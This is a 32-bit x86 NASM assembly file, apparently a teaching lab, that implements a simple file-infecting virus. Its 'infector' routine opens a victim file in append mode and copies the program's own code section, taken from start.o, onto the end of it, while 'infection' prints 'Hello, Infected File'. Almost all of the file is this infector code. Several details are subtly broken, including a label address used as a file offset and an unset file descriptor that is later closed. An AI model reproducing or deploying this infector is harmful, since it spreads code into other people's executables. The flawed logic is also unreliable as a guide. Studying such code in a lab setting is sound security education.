section .text
global _start
global system_call
extern main
global code_start
global infection
global infector

_start:
    pop    dword ecx    ; ecx = argc
    mov    esi,esp      ; esi = argv
    ;; lea eax, [esi+4*ecx+4] ; eax = envp = (4*ecx)+esi+4
    mov     eax,ecx     ; put the number of arguments into eax
    shl     eax,2       ; compute the size of argv in bytes
    add     eax,esi     ; add the size to the address of argv 
    add     eax,4       ; skip NULL at the end of argv
    push    dword eax   ; char *envp[]
    push    dword esi   ; char* argv[]
    push    dword ecx   ; int argc

    call    main        ; int main( int argc, char *argv[], char *envp[] )

    mov     ebx,eax
    mov     eax,1
    int     0x80
    nop
        
system_call:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...        
    mov     ebx, [ebp+12]   ; Next argument...
    mov     ecx, [ebp+16]   ; Next argument...
    mov     edx, [ebp+20]   ; Next argument...
    int     0x80            ; Transfer control to operating system
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller

code_start:
section .bss
    buffer: resb 8192
section .data
    infect: dd "Hello, Infected File",10,0
    infect_len: equ $ -infect
    error: dd "ERROR",10,0
    error_len: equ $ -error
    errorOp: dd "ERROR open",10,0
    errorOp_len: equ $ - errorOp
    open: dd 5
    write: dd 4
    append: dd 441h
    permission: dd 441
    fb: dd 0
    close: dd 6
    seek: dd 19
    start_file: db "start.o",0
    start_fb: dd 0
    read: dd 3
    stdout: dd 1
    allgood: db "bussiness is good",10,0
    len: equ $ -allgood


section .text
infection:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub esp,4
    pushad

    mov eax, 4
    mov ebx, 1
    mov ecx,infect
    mov edx, infect_len
    int 0x80

    mov [ebp-4],eax
    popad 
    mov eax,[ebp-4]
    add esp,4                  ; Restore caller state (registers)
    pop     ebp             ; Restore caller state
    ret          

infector:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad 
    
    ;;open file
    mov ebx, [ebp+8]    ;copy the first arguement (file name)
    mov eax, [open]
    mov ecx, [append]
    mov edx, [permission]
    int 0x80
    mov dword[fb],eax ;;store the FB in fb

    cmp eax,-1
    jng errOp

    ;seek the end of file
    mov eax,[seek]
    mov ebx,[fb]
    mov ecx,0
    mov edx,2
    int 0x80

    cmp eax,-1
    jng err

    ;;open start.o file
    mov ebx, start_file    ;copy the first arguement (file name)
    mov eax, [open]
    mov ecx, 2h      ;read and write only
    mov edx, 0
    int 0x80

    cmp eax,-1
    jng err

    mov esi,eax

    ;go to the required place
    mov eax,[seek]
    mov ebx, esi
    mov ecx, code_start
    mov edx, 0
    int 0x80

    cmp eax,-1
    jng err

    ;mov esi, eax
    ;;read rom the start.o the required laber (end-start labels)
    mov eax,[read]
    mov ebx, esi
    mov ecx, buffer
    mov edx, code_end-code_start
    int 0x80

    cmp eax,-1
    jng errOp
    
    ;;write the infection
    mov eax,[write]
    mov ebx,[fb]
    mov ecx,buffer
    mov edx,code_end-code_start
    int 0x80

    cmp eax,-1
    jng err

    ;;all good
    mov eax, [write]
    mov ebx,[stdout]
    mov ecx, allgood
    mov edx,len
    int 0x80

    cmp eax,-1
    jng err

    ;;close the file
    mov eax,dword[close]
    mov ebx,[fb]
    int 0x80

    mov eax,dword[close]
    mov ebx,[start_fb]
    int 0x80

end:
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret  

err:   
    mov eax, [write]
    mov ebx,[stdout]
    mov ecx,error
    mov edx,error_len
    int 0x80
    jmp end

errOp:   
    mov eax, [write]
    mov ebx,[stdout]
    mov ecx,errorOp
    mov edx,errorOp_len
    int 0x80
    jmp end

code_end: